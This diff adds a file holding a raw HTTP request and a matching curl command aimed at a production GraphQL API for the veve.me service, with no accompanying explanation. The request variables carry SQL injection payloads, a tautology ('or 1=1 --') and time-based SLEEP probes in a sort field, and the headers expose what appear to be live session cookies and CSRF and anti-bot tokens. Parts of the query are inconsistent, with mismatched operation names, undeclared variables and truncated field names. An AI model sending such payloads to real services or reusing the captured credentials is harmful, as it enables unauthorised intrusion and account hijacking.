@@ -1,0 +1,37 @@
+POST /graphql HTTP/2
+Host: web.api.prod.veve.me
+Cookie: _ga=GA1.1.683723552.1679763516; veve=s%3Ao4YxYhn4zhzkP2oWObUQnlPFJm50j5Zy.1jFaVXH9aP0keZDF0rx6SfMYfD5uOekXl4Is1uCEt5c; OptanonAlertBoxClosed=2023-04-15T14:06:27.455Z; OptanonConsent=isGpcEnabled=0&datestamp=Sat+Apr+15+2023+22%3A53%3A01+GMT%2B0530+(India+Standard+Time)&version=6.34.0&isIABGlobal=false&hosts=&consentId=31964766-5075-4fca-b30e-e217d86e9b48&interactionCount=2&landingPath=NotLandingPage&groups=C0004%3A1%2CC0002%3A1%2CC0001%3A1%2CC0003%3A1%2CC0005%3A1&geolocation=IN%3BPB&AwaitingReconsent=false; md_456_pgg-ssn=03AmQZWbTJuGVa6Gt6L12IeYoKoKzVGXGubn9eQHe4joCJBXuB0cwNtxEcNqV33dqoAf9uVZUb8rwIEHyLEzZ8oqsbWdHNCTb6lBJevErY1Axnwxy9Rdvs9tGgwoTxxeQ6zgtch3eNpqe6gfxwsqdoUNM1o; md_456_pgg=03AmQZWbTJuGVa6Gt6L12IeYoKoKzVGXGubn9eQHe4joCJBXuB0cwNtxEcNqV33dqoAf9uVZUb8rwIEHyLEzZ8oqsbWdHNCTb6lBJevErY1Axnwxy9Rdvs9tGgwoTxxeQ6zgtch3eNpqe6gfxwsqdoUNM1o; _ga_VYLZ9K4GY3=GS1.1.1681579252.4.1.1681579390.52.0.0; AMP_MKTG_1034237904=JTdCJTdE; AMP_1034237904=JTdCJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJkZXZpY2VJZCUyMiUzQSUyMjcwMGRkMTVjLTQ1MTEtNGJiMy05YTFiLTYwZTBlZmJjZDFlYyUyMiUyQyUyMmxhc3RFdmVudFRpbWUlMjIlM0ExNjgxNTc5NTIwOTIzJTJDJTIyc2Vzc2lvbklkJTIyJTNBMTY4MTU3OTM4NDM5NCUyQyUyMnVzZXJJZCUyMiUzQSUyMjFlNmQ1OTU3LTc3OGEtNDc2OC04MWM1LTk0MmEwYjI1ZDQwNCUyMiU3RA==
+Content-Length: 534
+Sec-Ch-Ua: "Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"
+X-Kpsdk-Cd: {"workTime":1681580791591,"id":"1ff23fd74537b9457bc9e535c272e18f","answers":[1,17],"duration":6.5,"d":92,"st":1681579382224,"rst":1681579382316}
+Client-Name: veve-app-web
+X-Datadog-Parent-Id: 2044434214348977529
+X-Datadog-Sampled: 1
+Sec-Ch-Ua-Platform: "Windows"
+X-Kpsdk-Ct: 03AmQZWbTJuGVa6Gt6L12IeYoKoKzVGXGubn9eQHe4joCJBXuB0cwNtxEcNqV33dqoAf9uVZUb8rwIEHyLEzZ8oqsbWdHNCTb6lBJevErY1Axnwxy9Rdvs9tGgwoTxxeQ6zgtch3eNpqe6gfxwsqdoUNM1o
+Sec-Ch-Ua-Mobile: ?0
+Client-Version: 1.245.0
+X-Datadog-Origin: rum
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+X-Datadog-Sampling-Priority: 1
+Content-Type: application/json
+Accept: */*
+Csrf-Token: mfajkxHX-9RbWYFAb0bATOR9LMHEKguMyTCU
+Client-Operation: EditBioMutation
+X-Datadog-Trace-Id: 7839151770398404377
+Origin: https://app.veve.me
+Sec-Fetch-Site: same-site
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,hi;q=0.8
+
+{"operationName":"pages","variables":{"offset":0,"limit":"' or 1=1 --","sortc":"name OR SLEEP(20)","sortrev":false},"query":"query pages($offset: Int!, $limit: Int!, $sortc: String, $sortrev: Boolean) {\n pages(offset: $offset, limit: $limit, sortc: $sortColumn, sortReverse: $sortReverse) {\n id\n n\n __typen\n }\n me {\n firstN\n lastN\n usern\n __typen\n }\n components {\n title\n __typen\n }\n templates {\n title\n __typen\n }\n fonts {\n n\n __typen\n }\n partners {\n id\n n\n banners {\n n\n __typen\n }\n __typen\n }\n}\n"}
+
+
+
+--------------------------------------------CURL---------------------------------------------------
+
+
+
+    -H $'Host: web.api.prod.veve.me' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.9,hi;q=0.8' -H $'Accept-Encoding: gzip, deflate' -H $'content-type: application/json' -H $'Cookie: _ga=GA1.1.683723552.1679763516; veve=s%3Ao4YxYhn4zhzkP2oWObUQnlPFJm50j5Zy.1jFaVXH9aP0keZDF0rx6SfMYfD5uOekXl4Is1uCEt5c; OptanonAlertBoxClosed=2023-04-15T14:06:27.455Z; AMP_MKTG_1034237904=JTdCJTdE; OptanonConsent=isGpcEnabled=0&datestamp=Sat+Apr+15+2023+23%3A27%3A28+GMT%2B0530+(India+Standard+Time)&version=6.34.0&isIABGlobal=false&hosts=&consentId=31964766-5075-4fca-b30e-e217d86e9b48&interactionCount=2&landingPath=NotLandingPage&groups=C0004%3A1%2CC0002%3A1%2CC0001%3A1%2CC0003%3A1%2CC0005%3A1&geolocation=IN%3BPB&AwaitingReconsent=false; md_456_pgg-ssn=02awrepimRIXk32j5ZlVH5adCqV3M07glA5LVe605jBdJZFxH4wDpIOm8z1wY1Ps7pgTbwAl0SMjNgFufOTDjz2YooejuH5BYoNOfIB8kURzyTP0iQWWELWSYyygz5ttqzioA5E8kvm3xzrL0LfSc8aam0A; md_456_pgg=02awrepimRIXk32j5ZlVH5adCqV3M07glA5LVe605jBdJZFxH4wDpIOm8z1wY1Ps7pgTbwAl0SMjNgFufOTDjz2YooejuH5BYoNOfIB8kURzyTP0iQWWELWSYyygz5ttqzioA5E8kvm3xzrL0LfSc8aam0A; _ga_VYLZ9K4GY3=GS1.1.1681581435.5.1.1681581456.39.0.0; AMP_1034237904=JTdCJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJkZXZpY2VJZCUyMiUzQSUyMjcwMGRkMTVjLTQ1MTEtNGJiMy05YTFiLTYwZTBlZmJjZDFlYyUyMiUyQyUyMmxhc3RFdmVudFRpbWUlMjIlM0ExNjgxNTgxNDkyMzA2JTJDJTIyc2Vzc2lvbklkJTIyJTNBMTY4MTU4MTQ2NTczNCUyQyUyMnVzZXJJZCUyMiUzQSUyMjFlNmQ1OTU3LTc3OGEtNDc2OC04MWM1LTk0MmEwYjI1ZDQwNCUyMiU3RA==' -H $'Origin: https://app.veve.me' -H $'Content-Length: 662' -H $'DNT: 1' -H $'Connection: close' \ --data-binary $'{"operationName":"pages","variables":{"offset":0,"limit":10,"sortc":"name OR SLEEP(2)","sortrev":false},"query":"query pages($offset: Int!, $limit: Int!, $sortc: String, $sortrev: Boolean) {\n  pages(offset: $offset, limit: $limit, sortc: $sortColumn, sortReverse: $sortReverse) {\n    id\n    n\n    __typen\n  }\n  me {\n    firstN\n    lastN\n    usern\n    __typen\n  }\n  components {\n    title\n    __typen\n  }\n  templates {\n    title\n    __typen\n  }\n  fonts {\n    n\n    __typen\n  }\n  partners {\n    id\n    n\n    banners {\n      n\n      __typen\n    }\n    __typen\n  }\n}\n"}' \ $'http://web.api.prod.veve.me/graphql'
